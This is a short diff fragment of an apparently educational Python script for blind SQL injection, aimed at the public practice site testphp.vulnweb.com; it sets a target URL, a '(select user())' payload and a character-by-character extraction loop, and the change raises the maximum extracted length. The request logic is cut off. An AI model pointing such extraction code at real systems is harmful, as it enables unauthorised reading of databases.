@@ -7,7 +7,7 @@ import re
 url = 'http://testphp.vulnweb.com/artists.php?artist=2' # target
 payload = '(select user())'; # your payload
 trueString = 'Blad3' # Text or html in the true condition
-maxLength = 10
+maxLength = 20
 result = ''
 for i in range(1, maxLength + 1):
     for j in range(32, 127):
